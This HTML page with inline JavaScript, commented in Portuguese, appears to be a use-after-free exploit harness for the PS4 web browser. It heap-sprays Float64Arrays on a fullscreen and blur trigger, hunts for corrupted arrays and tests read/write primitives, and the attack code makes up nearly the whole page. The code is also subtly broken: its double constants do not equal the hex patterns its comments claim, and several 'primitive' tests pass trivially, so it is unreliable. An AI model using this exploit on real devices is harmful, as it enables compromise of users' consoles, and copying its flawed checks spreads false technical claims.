<!DOCTYPE html>
<html>
<body>
    <h1>PS4 UAF - Debugger Core [v2.0 - Anti-FalsePositive]</h1>
    <button onclick="run()">EXECUTAR TESTE</button>
    <button onclick="selfTest()">AUTO-DIAGNÓSTICO</button>
    <hr>
    <div id="c"></div>

    <script>
        // Padrões de teste (IEEE 754 double precision)
        const P_A = 2.121995791e-314;      // 0x4141414141414141
        const P_B = 2.122007583e-314;      // 0x4242424242424242
        const P_C = 2.122019376e-314;      // 0x4343434343434343
        const M_V = 3.395193267e-313;      // 0xDEADBEEFCAFEBABE
        const W_V = 1.6045690773137395e-297; // 0x1337133713371337

        function f2h(f) {
            let b = new ArrayBuffer(8);
            (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }

        function h2f(hex) {
            let clean = hex.replace(/0x/g, '');
            let hi = parseInt(clean.slice(0, 8), 16);
            let lo = parseInt(clean.slice(8, 16), 16);
            let b = new ArrayBuffer(8);
            let u = new Uint32Array(b);
            u[0] = lo; u[1] = hi;
            return (new Float64Array(b))[0];
        }

        function log(tag, status, msg) {
            const colors = { PASS: "green", FAIL: "red", ERR: "orange", INFO: "blue", WARN: "purple" };
            const color = colors[status] || "black";
            document.getElementById('c').innerHTML += `<span style="color:${color}">[${tag}] ${status}</span> - ${msg}<br>`;
        }

        function selfTest() {
            document.getElementById('c').innerHTML = '';
            log("SELF", "INFO", "=== AUTO-DIAGNÓSTICO ===");
            
            // Test 1: Conversão f2h
            const tests = [
                { val: P_A, exp: "0x4141414141414141", name: "P_A" },
                { val: P_B, exp: "0x4242424242424242", name: "P_B" },
                { val: M_V, exp: "0xdeadbeefcafebabe", name: "M_V" },
                { val: W_V, exp: "0x1337133713371337", name: "W_V" }
            ];
            
            let failures = 0;
            for(let t of tests) {
                const got = f2h(t.val);
                if(got === t.exp) {
                    log("SELF", "PASS", `${t.name}: ${got}`);
                } else {
                    log("SELF", "FAIL", `${t.name}: esperado ${t.exp}, obtido ${got}`);
                    failures++;
                }
            }
            
            // Test 2: Conversão reversa
            const rev = h2f("0xdeadbeefcafebabe");
            if(f2h(rev) === "0xdeadbeefcafebabe") {
                log("SELF", "PASS", "h2f reverso OK");
            } else {
                log("SELF", "FAIL", `h2f reverso: ${f2h(rev)}`);
                failures++;
            }
            
            // Test 3: Float64Array básico
            const arr = new Float64Array(2);
            arr[0] = P_A;
            arr[1] = M_V;
            if(f2h(arr[0]) === "0x4141414141414141" && f2h(arr[1]) === "0xdeadbeefcafebabe") {
                log("SELF", "PASS", "Float64Array primitives OK");
            } else {
                log("SELF", "FAIL", `Array: [0]=${f2h(arr[0])}, [1]=${f2h(arr[1])}`);
                failures++;
            }
            
            if(failures === 0) {
                log("SELF", "PASS", "✅ Sistema OK - Pode prosseguir com o teste UAF");
            } else {
                log("SELF", "FAIL", `❌ ${failures} falhas detectadas - NÃO execute o teste UAF!`);
            }
        }

        function run() {
            document.getElementById('c').innerHTML = '';
            
            // Validação pré-teste
            if(f2h(P_A) === "0x0000000000000000") {
                log("INIT", "FAIL", "❌ ERRO CRÍTICO: Padrões de teste zerados! Execute AUTO-DIAGNÓSTICO.");
                return;
            }
            
            log("INIT", "INFO", "Criando 5000 Float64Arrays...");
            let ctrls = [];
            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8);
                a[0] = i; 
                ctrls.push(a);
            }
            
            log("INIT", "PASS", `Padrões: P_A=${f2h(P_A)}, M_V=${f2h(M_V)}`);
            log("WAIT", "INFO", "Entre em Fullscreen e aperte OPTIONS.");
            document.documentElement.webkitRequestFullscreen();

            window.onblur = function() {
                log("TRIG", "INFO", "Blur detectado. Iniciando Spray...");
                
                let spray = [];
                for(let i = 0; i < 8000; i++) {
                    let s = new Float64Array(8);
                    s.fill(P_A);
                    spray.push(s);
                }
                
                // Validação do spray
                if(f2h(spray[0][0]) !== f2h(P_A)) {
                    log("SPRAY", "FAIL", `Spray corrompido: esperado ${f2h(P_A)}, obtido ${f2h(spray[0][0])}`);
                    return;
                }
                
                let corr = null, corrIdx = -1;
                for(let i = 0; i < ctrls.length; i++) {
                    if(ctrls[i][0] === P_A) {
                        corr = ctrls[i];
                        corrIdx = i;
                        log("UAF", "PASS", `Index ${i}: corr[0]=${f2h(corr[0])}`);
                        break;
                    }
                }

                if(!corr) {
                    log("UAF", "FAIL", "Nenhuma corrupção detectada.");
                    return;
                }

                // TEST 1: Identidade Bidirecional
                log("TEST1", "INFO", "--- Identity Test (Bidirecional) ---");
                corr[4] = M_V;
                
                let matched = false;
                for(let i = 0; i < spray.length; i++) {
                    if(spray[i][4] === M_V) {
                        // Teste reverso
                        spray[i][5] = W_V;
                        if(corr[5] === W_V) {
                            log("TEST1", "PASS", `Bidirecional OK: corr⇄spray[${i}]`);
                            log("TEST1", "PASS", `Forward: corr[4]→spray=${f2h(M_V)}`);
                            log("TEST1", "PASS", `Reverse: spray[5]→corr=${f2h(W_V)}`);
                            matched = true;
                        } else {
                            log("TEST1", "WARN", `Unidirecional: corr→spray OK, spray→corr FAIL`);
                        }
                        break;
                    }
                }
                
                if(!matched) {
                    log("TEST1", "FAIL", `M_V não encontrado. corr[4]=${f2h(corr[4])}, spray[0][4]=${f2h(spray[0][4])}`);
                }

                // TEST 2: DataView Write Primitive
                log("TEST2", "INFO", "--- DataView Write ---");
                try {
                    const dv = new DataView(corr.buffer);
                    const before = f2h(corr[0]);
                    dv.setUint32(0, 0xDEADBEEF, true);
                    const after = f2h(corr[0]);
                    
                    if(before !== after && after.includes("deadbeef")) {
                        log("TEST2", "PASS", `Write: ${before} → ${after}`);
                    } else {
                        log("TEST2", "FAIL", `Sem mudança: ${before} → ${after}`);
                    }
                } catch(e) { log("TEST2", "ERR", e.message); }

                // TEST 3: Prototype Pollution
                log("TEST3", "INFO", "--- Prototype Hijack ---");
                try {
                    let reg = Array.from(corr);
                    Object.setPrototypeOf(reg, { token: 0xCAFEBABE });
                    
                    if(reg.token === 0xCAFEBABE) {
                        log("TEST3", "PASS", `Token injetado: 0x${reg.token.toString(16)}`);
                    } else {
                        log("TEST3", "FAIL", "Token não propagado");
                    }
                } catch(e) { log("TEST3", "ERR", e.message); }

                // TEST 4: Closure Leak
                log("TEST4", "INFO", "--- Closure Leak ---");
                try {
                    const leaked = [0].map(() => corr[0])[0];
                    log("TEST4", "PASS", `Leak: ${f2h(leaked)}`);
                } catch(e) { log("TEST4", "ERR", e.message); }
            };
        }
    </script>
</body>
</html>
